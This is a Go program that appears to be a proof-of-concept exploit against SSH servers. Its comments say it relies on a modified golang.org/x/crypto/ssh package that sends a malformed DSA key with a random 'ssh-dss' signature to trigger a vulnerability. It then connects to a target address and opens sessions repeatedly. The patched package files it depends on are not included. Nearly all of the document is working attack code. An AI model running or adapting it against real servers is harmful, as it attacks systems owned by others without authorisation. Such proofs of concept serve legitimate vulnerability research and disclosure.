// modify ssh client_auth.go to create a ssh.Signature
// from random 40 bytes and the type "ssh-dss" when it
// encounters ssh.Attack = true. We don't actually need a
// correct signature to exploit this vuln and this will get around
// the need to sign a message with our malformed dsa key
// which can also cause an infinite loop.

// files changed in ssh package:
//      client_auth.go
//      keys.go
//      attack.go
package main

import (
	"flag"
	"io"
	"io/ioutil"
	"log"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	attack = flag.Bool("attack", false, "send malformed dsa key")
	addr   = flag.String("address", "localhost:8022", "ssh server address")
	key    = flag.String("key", "", "key to auth with")
)

func init() {
	flag.Parse()
	if *attack {
		ssh.Attack = true
	}
	if *key == "" {
		log.Fatalln("must provide a auth key.")
	}
}

func main() {
	// load the key
	privBytes, err := ioutil.ReadFile(*key)
	if err != nil {
		log.Fatalln("failed loading private key: ", err)
	}
	signer, err := ssh.ParsePrivateKey(privBytes)
	if err != nil {
		log.Fatalln("failed to parse private key: ", err)
	}

	// create config
	config := &ssh.ClientConfig{}
	config.User = "dummy"
	config.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
	config.Timeout = time.Second * 10 // timeout after 10 seconds

	// dial server
	client, err := ssh.Dial("tcp", *addr, config)
	if err != nil {
		log.Fatalln("failed to dial ssh server: ", err)
	}
	log.Println("connected")

	ticker := time.Tick(3 * time.Second)
	for range ticker {
		session, err := client.NewSession()
		if err != nil {
			log.Fatalln("failed to create session: ", err)
		}
		output, err := session.StdoutPipe()
		if err != nil {
			log.Fatalln("failed to create output pipe: ", err)
		}
		if _, err = io.Copy(os.Stdout, output); err != nil {
			log.Fatalln("failed to copy data: ", err)
		}
	}
}
